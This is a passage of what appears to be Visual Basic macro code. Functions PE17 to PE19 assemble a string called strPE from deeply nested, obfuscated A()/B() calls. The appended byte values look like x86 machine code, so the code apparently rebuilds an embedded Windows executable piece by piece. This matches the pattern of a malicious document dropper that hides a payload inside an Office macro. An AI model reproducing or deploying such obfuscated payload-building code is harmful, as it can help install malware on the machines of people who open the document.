    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 139), 202), "u"), 198), 139), "E"), 248), 139), "U"), 21), "+"), 181), 242), "U"), 12), 133), 201), 137), 160), 127), 23), "|"), 8), 129), 225), 205), 0), 1), 0), "s"), 13), 179), "("), 155), 139), 16), "J"), 137), 16), 139), "E"), 16), 235), "<"), 139), 128), "x"), 139), 217), 131)
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 195), 149), 243), 198), 0), 0), 255), 255), 131), 209), 255), 137), 24), 139), ">"), 139), 198), 185), 10), 166), 0), 0), 232), "y"), 12), 0), 0), "/"), 139), 200), 139), "E"), 16), 128), 205), "R/0"), 255), 183), 0), 0), 192), 137), "!"), 131), 192), "[k"), 217)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 0), 220), 163), 0), "f"), 137), "0"), 128), "&c"), 137), "EW"), 15), "}"), 15), 139), 7), 133), 192), 137), "E"), 248), 15), 133), 150), 253), 255), 20), "_^[]"), 229), "]"), 144), 16), 0), "_^"), 184), "x"), 139), 1), 0), "["), 139), 226), 127), 194)
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 16), 0), 144), 144), 144), 144), 144), 144), "$+"), 144), "v"), 144), 144), 144), 144), "U"), 139), 236), 131), 236), 146), 139), "U"), 12), "S"), 22), "d"), 139), ":"), 133), 249), 137), "}"), 252), "u"), 14), 26), "^3"), 192), 207), 139), "#"), 179), 194), "K"), 0), 139), "4")
    strPE = A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 24), 139), "E"), 20), 131), 173), 0), "t"), 234), 139), "u"), 248), "3tf"), 139), 14), 131), 198), 2), 129), "s"), 128), 0), 0), 0), 137), "u"), 8), "^"), 22), "O"), 137), ":"), 139), "0"), 18), 137), "o"), 139), 242), 16), 136), 8), "@"), 137), "!"), 16), 233), 10)

    PE17 = strPE
End Function

Private Function PE18() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 1), 0), 0), 139), 193), "%"), 0), 252), "j"), 0), 180), 0), 220), 252), 0), 15), 132), 28), 1), 22), 15), "="), 127), 16), 0), 0), "uF"), 131), 255), 2), 15), 130), 254), 0), 0), 0), "f"), 139), "l"), 204), 208), 129), 248), "g"), 252), 0), 0), 129), 250)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 220), 0), 169), 15), 133), 245), 0), "+"), 0), 129), 225), 255), 3), 0), 0), "%"), 255), 25), 0), 0), 193), 225), 10), 11), 193), 131), 198), 2), 153), 139), 216), 139), 250), 129), 195), 0), 188), 1), 0), 137), 19), 8), 131), ","), 0), 235), 7), 139), 193)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 3), 139), 216), 139), 250), "7"), 195), 139), 215), "FG"), 0), 0), 0), 242), "U"), 4), 0), 0), 139), 200), 190), 1), "b"), 0), 0), 11), 202), "t"), 17), 185), "i"), 0), 29), ";c@"), 11), 230), 0), 139), 222), "F"), 11), 202), 132), 239), 139), "U"), 20)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(strPE, ";2"), 15), 131), "#"), 255), "1"), 255), "i"), 2), 158), 0), 0), 139), "Up;"), 198), 139), "E"), 252), 27), 201), 247), 217), "+"), 193), 131), 201), 236), "H"), 34), 206), "k&"), 139), "E"), 20), 139), 16), "."), 209), 137), 161), 139), 128), 16), 31), 246), 135)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 34), "2"), 1), 184), 128), 0), 0), 0), "9"), 4), 185), "t0"), 139), 208), 209), 250), 11), 194), "I"), 255), 253), 252), 138), "V$?"), 216), 135), 248), 12), 128), 139), 215), 136), 1), 24), 195), 185), 6), 0), 0), 0), 200), "G"), 187), 0), 0), 139), "M")
    strPE = A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 248), 139), 216), 139), "E"), 180), "N"), 139), 250), "u"), 250), 222), "U"), 216), 5), 12), "&Y"), 255), 139), 2), 253), 192), 137), "E"), 252), 15), 133), 178), 21), 255), 203), "_^["), 2), 229), "]"), 194), 16), 0), "_^"), 184), "x"), 17), 236), 0), "["), 139)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 229), "]"), 10), 167), 0), "_^"), 184), 22), 0), 0), "s\"), 139), "d]"), 194), 235), 0), 144), 144), 144), 144), 144), 144), 144), 144), "v"), 144), 192), "81U,"), 236), 139), "E"), 8), 136), 232), 2), "t"), 173), 255), 193), ","), 193), 23), 0), 199)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 0), "l'"), 0), 0), "3"), 192), "]"), 195), 0), "@"), 20), 249), "M"), 16), 139), "U"), 12), "PQR"), 232), 20), 0), 0), 0), 131), 196), 12), "]"), 195), 144), 144), "x"), 144), 153), 144), 144), 144), 144), 144), "C"), 144), 144), 144), 144), "U"), 139), 236), 181)
    strPE = A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "E"), 16), 139), "M"), 12), 131), 248), 16), "s"), 16), 255), 21), ","), 193), 187), 0), 199), 0), "}"), 0), 0), 0), "3"), 192), "P"), 195), "SV"), 236), 129), 8), "W"), 191), 4), 0), 243), 0), 138), 6), "F<Q"), 136), "E"), 16), "vc"), 139), 14), 16)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 187), 201), 0), 0), "V"), 156), 255), 139), 0), 0), 153), 247), 251), "c0"), 136), 234), 16), 255), 1), "A"), 254), 4), "*"), 9), "v"), 23), 139), "E"), 16), 187), 10), 0), 0), 0), 19), "a"), 0), 0), 0), 153), 247), 251), 4), "0"), 136), 1), "A"), 138), 194)
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 11), 15), 136), 1), "A"), 198), 200), ".'Uu"), 216), 139), "E"), 12), "_^"), 198), "L&"), 150), "[]"), 195), "U"), 139), 236), 131), 236), 12), "JV"), 139), "u"), 16), "W"), 131), ">"), 235), "w"), 17), "}"), 6), 0), 0), 0), 0), "_"), 247), "3")
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(strPE, 200), 249), 139), 229), "]"), 194), "H"), 0), 139), 216), 8), 139), 203), 24), 246), 196), "]t)"), 139), "C"), 12), 133), 147), "u^"), 139), 3), "j"), 20), "P"), 14), "9l"), 208), 155), 255), 255), 139), 200), 134), "<"), 137), "xu"), 137), "x"), 8), 137), "x")
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 12), "WW"), 166), 137), "x"), 16), "W"), 137), "K"), 12), 245), 21), 160), 192), "@"), 0), 139), "S"), 12), 137), "B7"), 139), "C"), 163), 139), "HA"), 133), 201), "u"), 145), 139), ";4"), 196), 136), 0), 255), 214), 133), 192), "u"), 9), "_^"), 168), 7), 221)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "]"), 194), "N"), 242), 255), 214), "_^"), 5), 128), 252), 213), 0), "["), 139), 229), "]"), 194), 12), "1"), 9), "C"), 211), 131), 207), 255), ";"), 199), "dE"), 12), "t("), 138), "K"), 17), 136), 8), 139), "m@"), 196), 137), 22), 137), "{0"), 139), 14), 137)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "E"), 137), 133), 201), "u"), 17), 199), 6), 1), 27), 0), 0), "_^3"), 192), "["), 139), 229), "i"), 194), 12), 0), 242), "KP"), 132), 201), 15), 132), 29), "u"), 0), 0), 0), "S"), 132), 139), ">R?E"), 252), 210), "}"), 248), 232), 157), 243), 255)
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 255), 131), "{Hou"), 183), "S"), 232), 145), 3), 140), 154), "3"), 201), 137), "E"), 8), ";"), 193), "t"), 21), 202), "CXj"), 232), 239), 243), 203), 165), 139), 240), 8), "_^["), 139), 229), "["), 194), 12), 0), 137), "K"), 197), 137), "KH"), 248)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(strPE, "KD"), 199), "E"), 146), 0), 0), 0), 0), "-"), 199), 139), 11), "h"), 133), 255), "@"), 134), 157), 0), 0), 0), 139), "_<"), 139), 150), 184), 176), 200), 236), "7"), 15), "C"), 169), 23), ")8"), 141), "U"), 244), "j"), 2), 31), "<"), 232), 234), 0), 0), 0)
    strPE = A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 170), "M"), 244), "3"), 213), 131), 196), 16), 210), 202), 137), "E"), 8), "t"), 133), 16), "s"), 12), 139), "CT"), 3), 241), 144), "KD"), 19), "b"), 137), "s"), 27), 137), "C#"), 152), "S<"), 139), "S<"), 139), 169), "De"), 194), ";"), 248), "w"), 2), 207)
    strPE = B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 183), 139), "s"), 142), "T"), 192), 252), 139), 200), 3), 242), 139), 209), 193), 128), 2), 243), 165), 139), 202), 139), "Q"), 252), 131), 225), 3), 216), 208), 243), 164), 202), 179), "<"), 139), "M"), 248), 154), 240), "+"), 163), 139), "E"), 8), 137), "s"), 181), ";uk;")
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "U"), 180), 133), "V"), 137), "M"), 248), 15), 132), "h"), 255), 255), 255), 235), 14), "="), 30), 17), 1), 217), 226), 7), 199), 238), "("), 1), 0), 0), 0), 139), "E"), 252), 197), "M"), 12), "+"), 193), 137), "2t"), 7), 199), "E"), 8), 134), 0), 0), 0), 139), "C")
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "X"), 150), 232), 13), 243), 255), 255), 139), "E"), 209), 154), "^;"), 172), 144), 229), 194), 12), 0), 153), 206), 141), "O"), 12), 253), "RPS"), 229), "}"), 0), 0), 0), 131), 196), 16), "=!"), 164), 1), 158), 137), "EYu"), 7), 199), "C("), 1)
    strPE = B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 139), "E"), 12), "_"), 137), 6), 139), "!"), 30), 135), "["), 139), 229), "]"), 248), 12), 0), 144), 144), 144), "J"), 144), 144), 144), 144), 144), "4"), 144), 144), 144), 6), "U"), 139), 236), "V"), 139), "uF"), 169), 139), "}"), 16), 139), 240), 16), 139), "N")
    strPE = A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 20), 11), 193), 199), "E"), 208), 0), 0), 0), 0), "uq"), 138), "F"), 8), 132), 248), 240), "j"), 139), "V2"), 141), "M"), 8), "j"), 0), "&j"), 0), "X"), 0), "j"), 0), "R"), 255), 21), 12), 192), "@"), 0), 161), 192), "u5"), 139), "5"), 152), 192), 163)
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "z"), 255), 214), 133), 6), "u"), 9), 139), "M"), 20), "_^/"), 1), "]"), 129), 255), 214), 177), 128), 181), 192), 0), "="), 237), 252), 10), 0), "u"), 5), 184), "~"), 17), 1), 0), 139), "M"), 20), "_K"), 199), 1), 0), 0), 0), 0), "]"), 255), 139), "E")
    strPE = B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 8), 133), 161), "u"), 14), 139), "U"), 20), "_^"), 137), 2), 184), 11), 0), 0), 0), "]"), 243), ";"), 248), "v"), 2), 139), 248), 139), " w"), 133), 192), "t#"), 138), "N"), 139), 138), 201), 249), 28), 139), "NP"), 137), "H"), 8), 139), "-P"), 139), "V")
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 132), 191), 171), 0), 232), 0), 232), 223), 6), 0), 0), 139), "V"), 12), "!l"), 12), 139), "F"), 12), 139), "U"), 12), "S"), 145), "M"), 16), "P"), 139), "F"), 4), "QWRP"), 255), "E"), 153), 192), "@"), 0), 133), 192), "t"), 7), "3"), 197), 233), "+"), 239)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 141), 0), 139), "="), 152), 192), "@I"), 255), 1), 133), 192), 7), 132), 27), 1), 0), 232), 14), 215), 5), 128), 252), 10), 0), "=e"), 0), 11), 0), 253), 133), 211), 0), 0), 0), 139), "B"), 156), 192), 169), 0), 139), "N"), 20), 139), "FJ}"), 201)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "|"), 22), 127), 4), 133), 192), "v"), 16), "j"), 0), "h"), 22), "R"), 0), 0), "QP"), 232), 240), 177), 0), 177), 235), 13), "#"), 193), 176), 248), 255), "u"), 236), 11), 192), 235), 132), "3"), 192), 139), "N"), 234), "PPQ"), 16), "R"), 255), 211), 139), "<"), 129)
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 255), 128), 0), 0), 0), "t"), 255), 133), 181), "t1"), 161), "`"), 9), "&,,^"), 4), 133), 192), "uq"), 148), 177), 187), 239), "A"), 0), "P"), 232), "a"), 247), 255), "o"), 131), 196), 12), 163), 142), 9), "A"), 0), 133), 192), "D"), 5), "S"), 255), 208)
    strPE = B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "G"), 8), "j"), 1), 255), 21), "("), 192), 182), 152), 248), "N"), 12), 139), ">T"), 141), "E"), 16), "j"), 1), "PQR"), 255), 21), 180), 192), "@"), 0), 133), 192), "t"), 19), ">"), 192), 235), "q"), 139), 29), 152), 192), "@"), 29), "7"), 211), 133), 192), "te")
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 255), 211), 5), "-"), 252), 191), 0), "=d'"), 11), 172), "t"), 7), "="), 233), 0), 11), 0), "u"), 26), 129), 255), 2), 181), 0), 0), "u"), 18), 139), "M"), 20), 139), 185), 16), "[_qw"), 17), 1), 0), 137), 16), 14), 224), 195), "="), 237), 252)
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 10), 0), "u"), 18), 139), "M"), 20), 139), "U"), 16), "[_"), 156), "~"), 17), 202), 229), 27), 17), "^]"), 195), "="), 166), 252), 10), 0), "u"), 18), 139), "M"), 220), 139), "U"), 16), "[_"), 184), "~"), 17), 1), 0), 137), 17), "^"), 152), 195), 153), 205), 169)
    strPE = A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(strPE, "8"), 139), "MR"), 133), 201), "u"), 18), 139), "M"), 20), 173), "U"), 16), 165), 150), 184), "~%"), 1), 175), 137), 17), "^]"), 202), ">V"), 12), 133), 210), "t"), 24), 138), "V"), 8), 132), 210), "um"), 139), "VP"), 3), "."), 139), "N"), 139), 131), 226)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 0), 137), "VP"), 137), "N"), 241), 139), 161), 22), 139), "U"), 16), "[_"), 34), 17), "^"), 10), 195), 144), 144), 170), 229), 144), 144), "U"), 139), 236), "0V"), 160), "u"), 8), 138), "F,J"), 150), 15), 132), "}"), 0), 0), 0), 139), "XH3"), 192)
    strPE = B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(strPE, "S"), 131), 249), 1), "W"), 137), "E"), 252), 23), "U"), 8), 15), 133), 156), 0), 0), 0), 139), 183), "<;"), 248), 15), "U"), 145), 0), 0), 0), 139), "^"), 31), 131), 255), 255), "v"), 5), 131), 200), 255), 235), 2), "O"), 199), 139), "V"), 4), 141), "M"), 252), "j")
    strPE = B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(strPE, 0), 133), "PSR"), 255), 21), 20), 192), "@"), 0), 133), 192), "t/"), 139), "E"), 235), 139), "VM"), 139), "NT"), 3), 208), 4), 209), 0), "+"), 248), 3), 216), 137), "VP"), 209), "b"), 194), "N"), 3), 198), 194), "~E"), 179), "_"), 199), "F<")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 28), "^"), 139), 229), "]"), 237), 4), 0), 188), "="), 152), 192), "@"), 0), 215), "2"), 133), 192), "u"), 5), 137), 5), 8), 235), 10), 255), 215), 5), 128), 252), 10), 0), 137), 235), 8), "6E"), 252), 139), "VP"), 139), 163), 179), 254), 164)
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 139), 202), 8), 137), "VP"), 131), 209), 0), 133), 192), 137), "NTu"), 7), 199), "F<="), 0), 0), 0), 139), "E"), 8), "_[^"), 139), 229), "]&"), 4), 0), "3"), 175), "^"), 139), 229), "]"), 194), "K"), 0), "n"), 144), 144), 144), 144), 144)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "U"), 139), 236), "?*"), 8), 141), "H"), 2), 184), "V"), 151), "UU2"), 233), 139), 202), 193), 233), 31), 3), 209), 141), 4), 149), 1), "H"), 139), 0), "]"), 194), 4), 0), 144), 144), 144), 144), 144), 186), 144), 144), 144), 144), 144), 144), 26), 144), "J"), 230)
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 236), 139), 196), 16), 139), "M"), 12), 139), 162), 8), "PoR"), 232), 12), "0"), 0), 0), "]"), 194), 12), 0), "_"), 19), 144), 144), 144), 144), 28), 144), 254), "X"), 236), 139), "."), 16), 139), 165), 3), 242), "V"), 141), "J"), 254), 159), 246), "W"), 139), "K"), 12)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "F"), 201), 208), "kC"), 210), "3"), 219), 138), 20), "7"), 131), 198), 23), 193), 234), 138), 164), 138), 4), 24), 199), "@"), 0), 136), "P"), 255), 10), "T"), 177), " "), 138), "\"), 255), 254), 131), 242), 3), 193), 226), 4), 193), 235), 4), 11), "'3"), 219), "@"), 138)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(strPE, 146), 24), 179), "@"), 0), 136), "P"), 135), 138), "T7}"), 138), "\'"), 255), "a"), 226), 15), 171), 226), 2), 218), 235), 6), 11), 211), "@"), 138), "*"), 24), 199), "@"), 0), 136), 241), 255), 138), "T7"), 255), 192), 226), "?@;"), 241), 138), 146), 24)
    strPE = A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 199), "@"), 0), 136), 5), 255), "|"), 152), 139), "U"), 16), 248), 1), "}"), 129), "3p"), 138), "c>"), 153), 233), 2), "@J"), 138), 137), 24), 199), "@"), 0), ";"), 242), 136), "H"), 255), 138), 20), ">u"), 21), 176), "w"), 229), "3"), 226), 4), "@~"), 138)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 24), 199), "@U"), 136), "H"), 255), 198), 0), "="), 235), "+"), 152), "L>"), 1), "3"), 219), 131), 226), 11), 138), 140), 143), 226), 4), 193), 137), 4), 11), "4@"), 138), 146), 24), 170), "@?"), 136), "P"), 255), 138), 9), 143), 225), 15), 138), 20), 141), 24)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 199), "@."), 136), 16), "@"), 198), 0), 244), 203), "VU"), 8), 198), 0), 231), "+"), 194), "P^@[]"), 194), 12), 0), 144), 154), 144), 144), 144), 144), 144), 144), 144), 144), "{=XqA"), 0), 255), "."), 12), 255), "t$&"), 215)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 21), 248), 192), "@"), 0), "Y"), 195), "hT@A"), 0), "hX@A"), 0), 255), "t$"), 12), 232), 248), 13), 0), 0), 131), 196), 12), 195), "Tt$"), 22), 232), 203), 147), 255), 255), 194), 216), 27), "GY"), 247), 216), "H"), 195), 204), 204)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 139), 220), "$"), 8), 139), "L$"), 16), 161), 200), 139), "L$"), 243), "u"), 9), 1), "D$"), 4), 247), 225), 194), 16), 0), "S"), 247), 225), 139), 216), 12), "D$"), 8), 247), 204), "$"), 20), 133), "01D$"), 8), 247), 225), 3), 211), "[i")
    strPE = A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 204), 0), 176), 204), 204), 131), 204), 204), 204), 204), 204), 204), 204), 204), 255), "%@"), 193), "rR"), 204), 204), 204), 204), 209), 204), 204), "s"), 204), 204), "SVr3"), 255), 139), 160), "$"), 20), 196), 192), "}0G"), 139), "T$"), 16), 247), 216)
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "K"), 218), 131), 216), 0), 147), "D$"), 165), 137), "T$"), 16), 139), "D$"), 28), 11), 192), "}"), 20), "G"), 139), "T$"), 24), 247), 216), 247), 218), 131), 216), 0), 137), "D$"), 28), 137), "T"), 133), 212), 11), 192), "u"), 24), 230), "L$"), 24), 139)

    PE18 = strPE
End Function

Private Function PE19() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "D$"), 20), 201), 210), 247), 241), 139), 216), 139), "D$"), 16), 247), 241), 139), 211), "NA"), 139), 216), 139), "J$"), 130), 139), "T$K"), 139), "D"), 14), 16), 209), 235), 17), 217), 209), 208), 209), 216), 11), 219), 129), 244), 247), 241), 139), 240), 225)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "d$"), 28), 139), 200), 139), "D"), 167), 24), 247), 230), 3), 209), "r"), 14), ";T$"), 20), "w"), 189), "r"), 7), ";"), 221), "$zq"), 1), "NI"), 210), 139), 198), "Uuk"), 247), 218), 247), 216), 8), 218), 253), "[^|"), 194), 16), 0)
    strPE = A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, "U"), 233), 236), "j"), 255), "h^"), 199), "@"), 0), "hH"), 185), "@"), 0), "?"), 161), 0), 0), 0), 255), ">d"), 137), 10), 0), 0), 0), 175), 131), 236), " SVW"), 219), "R"), 160), 131), "="), 140), "aj"), 1), 255), 21), 208), 192), "@"), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "Y"), 131), 238), "T"), 208), "A"), 0), 255), 131), 13), "X@A"), 160), 172), 255), 21), 212), 192), "@"), 0), "B"), 13), 152), 11), "c"), 0), 137), 8), 255), 21), 216), 192), "@E"), 139), 13), 251), 11), "A"), 0), 137), 238), 161), 220), 192), "@"), 0), 250), 0)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 163), "/@A"), 0), 232), 159), 2), 0), 0), 131), "=P"), 5), 216), 0), 0), "u\"), 201), "D"), 185), "@T"), 255), 21), 224), 192), "@"), 0), "Y"), 232), 222), 2), 0), 0), "h"), 7), 208), "@"), 0), "o"), 8), 208), "@"), 0), 226), "["), 2), 0)
